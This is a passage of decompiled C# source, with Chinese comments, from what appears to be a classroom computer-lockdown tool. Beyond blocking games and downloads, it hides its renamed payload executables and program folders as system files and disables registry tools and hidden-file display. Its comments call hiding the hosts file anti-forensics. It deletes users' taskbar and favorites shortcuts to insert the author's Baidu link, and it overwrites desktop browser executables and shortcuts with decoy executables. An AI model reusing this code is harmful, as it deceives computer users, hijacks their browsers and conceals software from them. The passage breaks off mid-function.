			根键 = CandidateAttr.SetInfo.Registry.LocalMachine;
			try
			{
				子键 = 根键.OpenSubKey("Software\\Policies\\Microsoft");
				if (子键 == null)
				{
					子键 = 根键.CreateSubKey("Software\\Policies\\Microsoft");
				}
				子键 = 根键.OpenSubKey("Software\\Policies\\Microsoft\\Edge");
				if (子键 == null)
				{
					子键 = 根键.CreateSubKey("Software\\Policies\\Microsoft\\Edge");
				}
			}
			catch
			{
			}

			// ⑪ 小游戏检查：禁止时关掉 Chrome 恐龙蛋和 Edge 冲浪游戏，允许时打开
			if (this.RadioButton13.Checked)
			{
				try
				{
					ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\Policies\\Google\\Chrome", "AllowDinosaurEasterEgg", 0, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\Policies\\Microsoft\\Edge", "AllowSurfGame", 0, RegistryValueKind.DWord);
				}
				catch
				{
				}
			}
			if (this.RadioButton14.Checked)
			{
				try
				{
					ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\Policies\\Google\\Chrome", "AllowDinosaurEasterEgg", 1, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\Policies\\Microsoft\\Edge", "AllowSurfGame", 1, RegistryValueKind.DWord);
				}
				catch
				{
				}
			}

			// ⑫ 清掉 14 个 IFEO 映像劫持项：别人禁掉系统小游戏时留下的劫持入口在这里被还原
			try
			{
				根键 = CandidateAttr.SetInfo.Registry.LocalMachine;
				根键.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sidebar.exe");
				根键.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Chess.exe");
				根键.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\FreeCell.exe");
				根键.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Hearts.exe");
				根键.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Minesweeper.exe");
				根键.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\PurblePlace.exe");
				根键.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Mahjong.exe");
				根键.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\SpiderSolitaire.exe");
				根键.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\bckgzm.exe");
				根键.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\chkrzm.exe");
				根键.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\shvlzm.exe");
				根键.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Solitaire.exe");
				根键.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\winmine");
				根键.DeleteSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\PurblePlace.exe");
			}
			catch
			{
			}

			// ⑬ 关掉 Edge 小组件、任务栏搜索框、任务视图按钮和 Windows 商店（减少学生可玩的东西）
			try
			{
				ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\Policies\\Microsoft\\Edge", "WebWidgetAllowed", 0, RegistryValueKind.DWord);
				ObserverAttr.RateInfo(Registry.CurrentUser, "Microsoft\\Windows\\CurrentVersion\\Search", "SearchboxTaskbarMode", 0, RegistryValueKind.DWord);
				ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\Policies\\Microsoft\\WindowsStore", "RemoveWindowsStore", 1, RegistryValueKind.DWord);
				ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "ShowTaskViewButton", 0, RegistryValueKind.DWord);
			}
			catch
			{
			}

			// ⑭ 让关机更快：超时改成 500、关掉启动延迟（配合 CallInfo 的查杀一起用）
			try
			{
				ObserverAttr.CountInfo(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "DesktopProcess");
				ObserverAttr.RateInfo(Registry.CurrentUser, "Control Panel\\Desktop", "AutoEndTasks", 1, RegistryValueKind.String);
				ObserverAttr.RateInfo(Registry.CurrentUser, "Control Panel\\Desktop", "HungAppTimeout", 500, RegistryValueKind.String);
				ObserverAttr.RateInfo(Registry.CurrentUser, "Control Panel\\Desktop", "WaitToKillAppTimeout", 500, RegistryValueKind.String);
				ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Serialize", "StartupDelayInMSec", 0, RegistryValueKind.DWord);
			}
			catch
			{
			}

			// ⑮ Windows 键检查 = 禁止：导入 huifu.reg 恢复被改掉的键，并放开托盘右键菜单
			if (this.RadioButton11.Checked)
			{
				try
				{
					File.Copy(Application.StartupPath + "\\huifu.wav", Application.StartupPath + "\\huifu.reg", true);
				}
				catch
				{
				}
				try
				{
					Interaction.Shell("regedit.exe /s " + Application.StartupPath + "\\huifu.reg", AppWinStyle.Hide, true, -1);
				}
				catch
				{
				}
				Thread.Sleep(1000);
				try
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoTrayContextMenu", 0, RegistryValueKind.DWord);
				}
				catch
				{
				}
			}

			// ⑯ 浏览器下载检查 = 禁止：IE 区域策略 + Edge/Chrome/Firefox 策略一起封掉下载和另存为
			if (this.RadioButton8.Checked)
			{
				try
				{
					根键 = CandidateAttr.SetInfo.Registry.LocalMachine;
					ObserverAttr.RateInfo(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3", "1803", 3, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3", "2200", 1, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions", "NoBrowserSaveAs", 1, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\Policies\\Microsoft\\Edge", "DownloadRestrictions", 3, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\Policies\\Microsoft\\Edge", "SaveAs", 0, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\Policies\\Google\\Chrome", "DownloadRestrictions", 3, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\Policies\\Google\\Chrome", "SaveAs", 0, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\Policies\\Mozilla\\Firefox", "DisableDownloads", 1, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\Policies\\Mozilla\\Firefox", "BlockAboutDownloads", 1, RegistryValueKind.DWord);
				}
				catch
				{
				}
			}

			// ⑰ 浏览器下载检查 = 允许：同样的策略值全部放开
			if (this.RadioButton7.Checked)
			{
				try
				{
					根键 = CandidateAttr.SetInfo.Registry.LocalMachine;
					ObserverAttr.RateInfo(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3", "1803", 0, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3", "2200", 0, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions", "NoBrowserSaveAs", 0, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\Policies\\Microsoft\\Edge", "DownloadRestrictions", 0, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\Policies\\Microsoft\\Edge", "SaveAs", 1, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\Policies\\Google\\Chrome", "DownloadRestrictions", 0, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\Policies\\Google\\Chrome", "SaveAs", 1, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\Policies\\Mozilla\\Firefox", "DisableDownloads", 0, RegistryValueKind.DWord);
					ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\Policies\\Mozilla\\Firefox", "BlockAboutDownloads", 0, RegistryValueKind.DWord);
				}
				catch
				{
				}
			}
			Thread.Sleep(1000);

			// ⑱ 反取证：hosts 和 etc 目录设成只读+隐藏+系统
			try
			{
				File.SetAttributes(this.hosts文件路径, File.GetAttributes(this.hosts文件路径) | FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes("C:\\Windows\\System32\\drivers\\etc", File.GetAttributes("C:\\Windows\\System32\\drivers\\etc") | FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
			}
			catch
			{
			}

			// ⑲ 同时关掉「显示隐藏文件」「显示受保护的系统文件」和文件夹选项里的单选框值
			try
			{
				ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", 0, RegistryValueKind.DWord);
				ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "ShowSuperHidden", 0, RegistryValueKind.DWord);
				ObserverAttr.RateInfo(Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL", "CheckedValue", 0, RegistryValueKind.DWord);
			}
			catch
			{
			}

			// ⑳ 浏览器下载检查 = 禁止：连「文件夹选项」一起禁掉，学生改不了查看设置
			if (this.RadioButton8.Checked)
			{
				try
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoFolderOptions", 1, RegistryValueKind.DWord);
				}
				catch
				{
				}
			}

			// 浏览器下载检查 = 允许：文件夹选项放开
			if (this.RadioButton7.Checked)
			{
				try
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoFolderOptions", 0, RegistryValueKind.DWord);
				}
				catch
				{
				}
			}
			try
			{
				ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}

			// ㉑ 主程序关闭方式 = 完全禁止：重建策略键并禁掉注册表工具，让学生改不回来
			if (this.RadioButton20.Checked)
			{
				try
				{
					根键 = CandidateAttr.SetInfo.Registry.CurrentUser;
					子键 = 根键.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
					if (子键 == null)
					{
						子键 = 根键.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
					}
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", 1, RegistryValueKind.DWord);
				}
				catch
				{
				}
			}
			// 主程序关闭方式 = 自动关闭：注册表工具放开
			if (this.RadioButton19.Checked)
			{
				try
				{
					ObserverAttr.RateInfo(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", 0, RegistryValueKind.DWord);
				}
				catch
				{
				}
			}

			// ㉒ 藏掉小游戏目录、禁用 IPv6、关掉平板提示条
			try
			{
				File.SetAttributes("C:\\Program Files\\Microsoft Games", File.GetAttributes("C:\\Program Files\\Microsoft Games") | FileAttributes.Hidden | FileAttributes.System);
			}
			catch
			{
			}
			try
			{
				ObserverAttr.RateInfo(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\Tcpip6\\Parameters", "DisabledComponents", 255, RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				ObserverAttr.RateInfo(Registry.CurrentUser, "SOFTWARE\\Microsoft\\TabletTip\\1.7", "TipbandDesiredVisibility", 0, RegistryValueKind.DWord);
			}
			catch
			{
			}

			// ㉓ 把三个载荷 exe 复制到 c:\windows\jf 并改名成 .dat：按进程名查不到，双击也起不来
			try
			{
				Directory.CreateDirectory(this.程序释放目录);
			}
			catch
			{
			}
			try
			{
				File.Copy(Application.StartupPath + "\\jfglzsn.exe", this.程序释放目录 + "\\jfglzsn.dat", true);
			}
			catch
			{
			}
			try
			{
				File.Copy(Application.StartupPath + "\\przs.exe", this.程序释放目录 + "\\przs.dat", true);
			}
			catch
			{
			}
			try
			{
				File.Copy(Application.StartupPath + "\\zmserv.exe", this.程序释放目录 + "\\zmserv.dat", true);
			}
			catch
			{
			}

			// ㉔ 释放目录和三份 .dat 一并设成隐藏+系统（原版逐条忽略错误，这里合并成一个块）
			try
			{
				File.SetAttributes(this.程序释放目录, File.GetAttributes(this.程序释放目录) | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(this.程序释放目录 + "\\jfglzsn.dat", File.GetAttributes(this.程序释放目录 + "\\jfglzsn.dat") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(this.程序释放目录 + "\\przs.dat", File.GetAttributes(this.程序释放目录 + "\\przs.dat") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(this.程序释放目录 + "\\zmserv.dat", File.GetAttributes(this.程序释放目录 + "\\zmserv.dat") | FileAttributes.Hidden | FileAttributes.System);
			}
			catch
			{
			}

			// ㉕ 程序目录里的 exe / wav / txt / regini.exe 全部改成隐藏+系统文件
			try
			{
				File.SetAttributes(Application.StartupPath + "\\jfglzsn.exe", File.GetAttributes(Application.StartupPath + "\\jfglzsn.exe") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(Application.StartupPath + "\\zmserv.exe", File.GetAttributes(Application.StartupPath + "\\zmserv.exe") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(Application.StartupPath + "\\przs.exe", File.GetAttributes(Application.StartupPath + "\\przs.exe") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(Application.StartupPath + "\\set.exe", File.GetAttributes(Application.StartupPath + "\\set.exe") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(Application.StartupPath + "\\uninstall.exe", File.GetAttributes(Application.StartupPath + "\\uninstall.exe") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(Application.StartupPath + "\\about.exe", File.GetAttributes(Application.StartupPath + "\\about.exe") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(Application.StartupPath + "\\yl.wav", File.GetAttributes(Application.StartupPath + "\\yl.wav") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(Application.StartupPath + "\\huifu.wav", File.GetAttributes(Application.StartupPath + "\\huifu.wav") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(Application.StartupPath + "\\hmd_local.txt", File.GetAttributes(Application.StartupPath + "\\hmd_local.txt") | FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(Application.StartupPath + "\\regini.exe", File.GetAttributes(Application.StartupPath + "\\regini.exe") | FileAttributes.Hidden | FileAttributes.System);
			}
			catch
			{
			}

			// ㉖ 程序目录本身和 Microsoft.NET 目录一起藏起来
			try
			{
				File.SetAttributes(Application.StartupPath, File.GetAttributes(Application.StartupPath) | FileAttributes.Hidden | FileAttributes.System);
			}
			catch
			{
			}
			try
			{
				File.SetAttributes("C:\\Windows\\Microsoft.NET", File.GetAttributes("C:\\Windows\\Microsoft.NET") | FileAttributes.Hidden | FileAttributes.System);
			}
			catch
			{
			}

			// ㉗ 删掉临时导出的 .reg（wav 还在，下次还能重新生成）
			try
			{
				File.Delete(Application.StartupPath + "\\yl.reg");
				File.Delete(Application.StartupPath + "\\huifu.reg");
			}
			catch
			{
			}
			Thread.Sleep(1000);
		}

		// Token: 0x0600003C RID: 60 RVA: 0x000051A8 File Offset: 0x000033A8
		/// <summary>
		/// 快捷方式劫持。依次清空「快速启动栏」和「任务栏固定项」目录，塞进自带的
		/// zy\Internet   Explore.lnk（文件名里确实是三个空格，原版如此）；再清空收藏夹
		/// 的 links 目录并塞入作者的「百度搜索&amp;网址导航.url」；最后把
		/// HKCU\Software\Microsoft\Internet Explorer\LinksBar\Enabled 置 1，让收藏夹栏常驻。
		/// 原版逐条 On Error Resume Next，这里按「一个动作」分块容错。
		/// </summary>
		private void UpdateInfo()
		{
			string 快速启动目录 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Internet Explorer\\Quick Launch";
			try
			{
				Microsoft.VisualBasic.FileSystem.Kill(快速启动目录 + "\\*.*");
			}
			catch
			{
			}
			try
			{
				File.Copy(Application.StartupPath + "\\zy\\Internet   Explore.lnk", 快速启动目录 + "\\Internet   Explore.lnk", true);
			}
			catch
			{
			}
			string 任务栏固定目录 = 快速启动目录 + "\\User Pinned\\TaskBar";
			try
			{
				Microsoft.VisualBasic.FileSystem.Kill(任务栏固定目录 + "\\*.*");
			}
			catch
			{
			}
			try
			{
				File.Copy(Application.StartupPath + "\\zy\\Internet   Explore.lnk", 任务栏固定目录 + "\\Internet   Explore.lnk", true);
			}
			catch
			{
			}
			string 收藏夹目录 = "";
			try
			{
				收藏夹目录 = Conversions.ToString(ObserverAttr.SortInfo(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", "Favorites", ""));
			}
			catch
			{
			}
			string 收藏夹链接目录 = 收藏夹目录 + "\\links";
			// 原版把同一个路径取了两次（text4 / text5），两次清空都要执行
			string 收藏夹链接目录2 = 收藏夹目录 + "\\links";
			try
			{
				Microsoft.VisualBasic.FileSystem.Kill(收藏夹链接目录 + "\\*.*");
			}
			catch
			{
			}
			try
			{
				Microsoft.VisualBasic.FileSystem.Kill(收藏夹链接目录2 + "\\*.*");
			}
			catch
			{
			}
			try
			{
				File.Copy(Application.StartupPath + "\\zy\\百度搜索&网址导航.url", 收藏夹链接目录 + "\\百度搜索&网址导航.url", true);
			}
			catch
			{
			}
			try
			{
				File.Copy(Application.StartupPath + "\\zy\\百度搜索&网址导航.url", 收藏夹链接目录 + "\\百度搜索&网址导航.url", true);
			}
			catch
			{
			}
			RegistryKey 当前用户 = CandidateAttr.SetInfo.Registry.CurrentUser;
			RegistryKey 链接栏键 = null;
			// 确保 LinksBar 键存在（原版先 Open 可写，取不到再 Create）
			try
			{
				链接栏键 = 当前用户.OpenSubKey("Software\\Microsoft\\Internet Explorer\\LinksBar", true);
				if (链接栏键 == null)
				{
					链接栏键 = 当前用户.CreateSubKey("Software\\Microsoft\\Internet Explorer\\LinksBar");
				}
			}
			catch
			{
			}
			try
			{
				链接栏键.SetValue("Enabled", 1);
			}
			catch
			{
			}
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00005418 File Offset: 0x00003618
		/// <summary>
		/// 浏览器入口替换。四轮扫描：桌面 exe → 公共桌面 exe → 桌面 lnk → 公共桌面 lnk，
		/// 按 11 个浏览器关键字匹配：
		/// exe 命中后把属主改成 Normal，再用程序目录 zy\ 下的同名马甲 exe 覆盖；
		/// lnk 命中后先读出真实目标写进 HKCU\Software\&lt;品牌&gt;，再删快捷方式、放马甲 exe
		/// （Edge 例外：只有目标里带 .exe 才记路径并替换）。
		/// 一个都没命中就往桌面塞「百度搜索&amp;网址导航.url」，再清掉桌面上「网址导航 /
		/// 上网导航 / 百度一下」这类快捷方式；最后把 zy\ 目录（含子目录）里的文件永久删除，
		/// 抹掉马甲来源。原版逐条忽略错误，这里每轮扫描合并成一个 try/catch。
		/// </summary>
		private void CollectInfo()
		{
			checked
			{
				int 命中数 = 0;
				string 桌面目录 = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
				string 公共桌面目录 = "C:\\Users\\Public\\Desktop";

				// 第一轮：桌面上的 .exe
				try
				{
					IEnumerator<string> 桌面exe = CandidateAttr.SetInfo.FileSystem.GetFiles(桌面目录, Microsoft.VisualBasic.FileIO.SearchOption.SearchTopLevelOnly, new string[] { "*.exe" }).GetEnumerator();
					while (桌面exe.MoveNext())
					{
						string 文件 = 桌面exe.Current;
						if (Strings.InStr(文件, "360安全浏览器", CompareMethod.Binary) > 0)
						{
							命中数++;
							File.SetAttributes(文件, FileAttributes.Normal);
							File.Copy(Application.StartupPath + "\\zy\\360安全浏览器.exe", 桌面目录 + "\\360安全浏览器.exe", true);
						}
						else if (Strings.InStr(文件, "Google Chrome", CompareMethod.Binary) > 0)
						{
							命中数++;
							File.SetAttributes(文件, FileAttributes.Normal);
							File.Copy(Application.StartupPath + "\\zy\\Google Chrome.exe", 桌面目录 + "\\Google Chrome.exe", true);
						}
						else if (Strings.InStr(文件, "2345加速浏览器", CompareMethod.Binary) > 0)
						{
							命中数++;
							File.SetAttributes(文件, FileAttributes.Normal);
							File.Copy(Application.StartupPath + "\\zy\\2345加速浏览器.exe", 桌面目录 + "\\2345加速浏览器.exe", true);
						}
						else if (Strings.InStr(文件, "360极速浏览器", CompareMethod.Binary) > 0)
						{
							命中数++;
							File.SetAttributes(文件, FileAttributes.Normal);
							File.Copy(Application.StartupPath + "\\zy\\360极速浏览器.exe", 桌面目录 + "\\360极速浏览器.exe", true);
						}
						else if (Strings.InStr(文件, "360 极速浏览器X", CompareMethod.Binary) > 0)
						{
							命中数++;
							File.SetAttributes(文件, FileAttributes.Normal);
							File.Copy(Application.StartupPath + "\\zy\\360 极速浏览器X.exe", 桌面目录 + "\\360 极速浏览器X.exe", true);
						}
						else if (Strings.InStr(文件, "QQ浏览器", CompareMethod.Binary) > 0)
						{
							命中数++;
							File.SetAttributes(文件, FileAttributes.Normal);
							File.Copy(Application.StartupPath + "\\zy\\QQ浏览器.exe", 桌面目录 + "\\QQ浏览器.exe", true);
						}
						else if (Strings.InStr(文件, "极速浏览器", CompareMethod.Binary) > 0)
						{
							命中数++;
							File.SetAttributes(文件, FileAttributes.Normal);
							File.Copy(Application.StartupPath + "\\zy\\极速浏览器.exe", 桌面目录 + "\\极速浏览器.exe", true);
						}
						else if (Strings.InStr(文件, "双核浏览器", CompareMethod.Binary) > 0)
						{
							命中数++;
							File.SetAttributes(文件, FileAttributes.Normal);
							File.Copy(Application.StartupPath + "\\zy\\双核浏览器.exe", 桌面目录 + "\\双核浏览器.exe", true);
						}
						else if (Strings.InStr(文件, "Firefox", CompareMethod.Binary) > 0)
						{
							命中数++;
							File.SetAttributes(文件, FileAttributes.Normal);
							File.Copy(Application.StartupPath + "\\zy\\Firefox.exe", 桌面目录 + "\\Firefox.exe", true);
						}
						else if (Strings.InStr(文件, "谷歌浏览器", CompareMethod.Binary) > 0)
						{
							// 这个不是真 Chrome，是别人放的假快捷方式/假程序，直接删掉
							Interaction.MsgBox("删除桌面上假google chrome的快捷方式，win7先下载安装正版google chrome再重新设置。", MsgBoxStyle.OkOnly, null);
							File.SetAttributes(文件, FileAttributes.Normal);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
						}
						else if (Strings.InStr(文件, "Microsoft Edge", CompareMethod.Binary) > 0)
						{
							命中数++;
							File.SetAttributes(文件, FileAttributes.Normal);
							File.Copy(Application.StartupPath + "\\zy\\Microsoft Edge.exe", 桌面目录 + "\\Microsoft Edge.exe", true);
						}
					}
					if (桌面exe != null)
					{
						桌面exe.Dispose();
					}
				}
				catch
				{
				}
				// 第二轮：公共桌面（C:\Users\Public\Desktop）上的 .exe
				try
				{
					IEnumerator<string> 公共桌面exe = CandidateAttr.SetInfo.FileSystem.GetFiles(公共桌面目录, Microsoft.VisualBasic.FileIO.SearchOption.SearchTopLevelOnly, new string[] { "*.exe" }).GetEnumerator();
					while (公共桌面exe.MoveNext())
					{
						string 文件 = 公共桌面exe.Current;
						if (Strings.InStr(文件, "360安全浏览器", CompareMethod.Binary) > 0)
						{
							命中数++;
							File.SetAttributes(文件, FileAttributes.Normal);
							File.Copy(Application.StartupPath + "\\zy\\360安全浏览器.exe", 公共桌面目录 + "\\360安全浏览器.exe", true);
						}
						else if (Strings.InStr(文件, "Google Chrome", CompareMethod.Binary) > 0)
						{
							命中数++;
							File.SetAttributes(文件, FileAttributes.Normal);
							File.Copy(Application.StartupPath + "\\zy\\Google Chrome.exe", 公共桌面目录 + "\\Google Chrome.exe", true);
						}
						else if (Strings.InStr(文件, "2345加速浏览器", CompareMethod.Binary) > 0)
						{
							命中数++;
							File.SetAttributes(文件, FileAttributes.Normal);
							File.Copy(Application.StartupPath + "\\zy\\2345加速浏览器.exe", 公共桌面目录 + "\\2345加速浏览器.exe", true);
						}
						else if (Strings.InStr(文件, "360极速浏览器", CompareMethod.Binary) > 0)
						{
							命中数++;
							File.SetAttributes(文件, FileAttributes.Normal);
							File.Copy(Application.StartupPath + "\\zy\\360极速浏览器.exe", 公共桌面目录 + "\\360极速浏览器.exe", true);
						}
						else if (Strings.InStr(文件, "360 极速浏览器X", CompareMethod.Binary) > 0)
						{
							命中数++;
							File.SetAttributes(文件, FileAttributes.Normal);
							File.Copy(Application.StartupPath + "\\zy\\360 极速浏览器X.exe", 公共桌面目录 + "\\360 极速浏览器X.exe", true);
						}
						else if (Strings.InStr(文件, "QQ浏览器", CompareMethod.Binary) > 0)
						{
							命中数++;
							File.SetAttributes(文件, FileAttributes.Normal);
							File.Copy(Application.StartupPath + "\\zy\\QQ浏览器.exe", 公共桌面目录 + "\\QQ浏览器.exe", true);
						}
						else if (Strings.InStr(文件, "极速浏览器", CompareMethod.Binary) > 0)
						{
							命中数++;
							File.SetAttributes(文件, FileAttributes.Normal);
							File.Copy(Application.StartupPath + "\\zy\\极速浏览器.exe", 公共桌面目录 + "\\极速浏览器.exe", true);
						}
						else if (Strings.InStr(文件, "双核浏览器", CompareMethod.Binary) > 0)
						{
							命中数++;
							File.SetAttributes(文件, FileAttributes.Normal);
							File.Copy(Application.StartupPath + "\\zy\\双核浏览器.exe", 公共桌面目录 + "\\双核浏览器.exe", true);
						}
						else if (Strings.InStr(文件, "Firefox", CompareMethod.Binary) > 0)
						{
							命中数++;
							File.SetAttributes(文件, FileAttributes.Normal);
							File.Copy(Application.StartupPath + "\\zy\\Firefox.exe", 公共桌面目录 + "\\Firefox.exe", true);
						}
						else if (Strings.InStr(文件, "谷歌浏览器", CompareMethod.Binary) > 0)
						{
							Interaction.MsgBox("删除桌面上假google chrome的快捷方式，win7先下载安装正版google chrome再重新设置。", MsgBoxStyle.OkOnly, null);
							File.SetAttributes(文件, FileAttributes.Normal);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
						}
						else if (Strings.InStr(文件, "Microsoft Edge", CompareMethod.Binary) > 0)
						{
							命中数++;
							File.SetAttributes(文件, FileAttributes.Normal);
							File.Copy(Application.StartupPath + "\\zy\\Microsoft Edge.exe", 公共桌面目录 + "\\Microsoft Edge.exe", true);
						}
					}
					if (公共桌面exe != null)
					{
						公共桌面exe.Dispose();
					}
				}
				catch
				{
				}
				// 第三轮：桌面上的 .lnk。先读出真实目标写进 HKCU\Software\<品牌>，
				// 再删掉原快捷方式、换成同名马甲 exe
				try
				{
					IEnumerator<string> 桌面快捷方式 = CandidateAttr.SetInfo.FileSystem.GetFiles(桌面目录, Microsoft.VisualBasic.FileIO.SearchOption.SearchTopLevelOnly, new string[] { "*.lnk" }).GetEnumerator();
					while (桌面快捷方式.MoveNext())
					{
						string 文件 = 桌面快捷方式.Current;
						if (Strings.InStr(文件, "360安全浏览器", CompareMethod.Binary) > 0)
						{
							string 真实路径 = this.ReadShortCut(文件);
							ObserverAttr.RateInfo(Registry.CurrentUser, "Software", "360", 真实路径, RegistryValueKind.String);
							File.SetAttributes(文件, FileAttributes.Normal);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
							File.Copy(Application.StartupPath + "\\zy\\360安全浏览器.exe", 桌面目录 + "\\360安全浏览器.exe", true);
							命中数++;
						}
						else if (Strings.InStr(文件, "Google Chrome", CompareMethod.Binary) > 0)
						{
							string 真实路径 = this.ReadShortCut(文件);
							ObserverAttr.RateInfo(Registry.CurrentUser, "Software", "chrome", 真实路径, RegistryValueKind.String);
							File.SetAttributes(文件, FileAttributes.Normal);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
							File.Copy(Application.StartupPath + "\\zy\\Google Chrome.exe", 桌面目录 + "\\Google Chrome.exe", true);
							命中数++;
						}
						else if (Strings.InStr(文件, "2345加速浏览器", CompareMethod.Binary) > 0)
						{
							string 真实路径 = this.ReadShortCut(文件);
							ObserverAttr.RateInfo(Registry.CurrentUser, "Software", "2345", 真实路径, RegistryValueKind.String);
							File.SetAttributes(文件, FileAttributes.Normal);
							Microsoft.VisualBasic.FileSystem.Kill(文件);
							File.Copy(Application.StartupPath + "\\zy\\2345加速浏览器.exe", 桌面目录 + "\\2345加速浏览器.exe", true);
							命中数++;
						}
						else if ((Strings.InStr(文件, "Firefox", CompareMethod.Binary) > 0) | (Strings.InStr(文件, "firefox", CompareMethod.Binary) > 0))
						{
							string 真实路径 = this.ReadShortCut(文件);
